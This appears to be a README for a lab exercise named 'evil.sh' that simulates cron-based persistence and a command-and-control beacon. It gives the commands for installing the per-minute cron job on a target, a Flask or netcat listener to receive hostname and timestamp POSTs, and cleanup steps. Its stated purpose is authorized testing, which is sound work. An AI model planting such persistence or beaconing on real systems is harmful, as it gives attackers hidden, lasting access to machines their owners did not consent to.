#############################################################
#                  evil.sh - Persistence Test               #
#           Cron-based C2 Beacon - Controlled Lab Use       #
#############################################################

Author: [Your Name or Handle]
Date: [Today’s Date]

-------------------------------------------------------------
📌 Description:
This script (evil.sh) is designed to simulate persistence via cron
combined with beaconing (outbound HTTP requests) to a remote server.

The cron job will execute every minute and send a POST request
with the machine hostname and timestamp to a listener you control.

-------------------------------------------------------------
🛠️  Part 1 – Set up the cron job on the target machine:

1. Copy `evil.sh` to /tmp and make it executable:
   --------------------------------------------------
   cp evil.sh /tmp/evil.sh
   chmod +x /tmp/evil.sh
   --------------------------------------------------

2. Create the cron job:
   --------------------------------------------------
   echo "* * * * * /tmp/evil.sh >> /tmp/cron_beacon.log 2>&1" > /tmp/persistevil
   crontab -l > /tmp/notevil 2>/dev/null
   crontab /tmp/persistevil
   --------------------------------------------------

3. Every minute, this will:
   - Execute /tmp/evil.sh
   - Append any output or errors to /tmp/cron_beacon.log

-------------------------------------------------------------
🛠️  Part 2 – Set up the listener (C2 server):

🖥️ Option A: Python Flask Listener (Recommended)

1. Install Flask:
   pip install flask

2. Create a file named `listener.py` with this content:
   --------------------------------------------------
   from flask import Flask, request

   app = Flask(__name__)

   @app.route('/beacon', methods=['POST'])
   def beacon():
       data = request.form.to_dict()
       print(f"[+] Beacon received: {data}")
       return '', 200

   app.run(host='0.0.0.0', port=8000)
   --------------------------------------------------

3. Run the listener:
   python3 listener.py

4. You will see output like:
   [+] Beacon received: {'host': 'victim-host', 'time': '1695156666'}

🖥️ Option B: Netcat (basic, raw)

   nc -lvnp 8000

   You'll see raw HTTP POST data from the cron beacon.

-------------------------------------------------------------
📁 Logs on the victim (target) system:

- Cron execution output: /tmp/cron_beacon.log
- You can tail the file:
  tail -f /tmp/cron_beacon.log

-------------------------------------------------------------
🧼 To clean up:

1. Restore original crontab:
   crontab /tmp/notevil

2. Delete temporary files:
   rm /tmp/evil.sh /tmp/persistevil /tmp/notevil /tmp/cron_beacon.log

-------------------------------------------------------------
⚠️ Legal Notice:
This script is for educational and authorized testing only.
Use it only in isolated environments or with explicit permission.

#############################################################
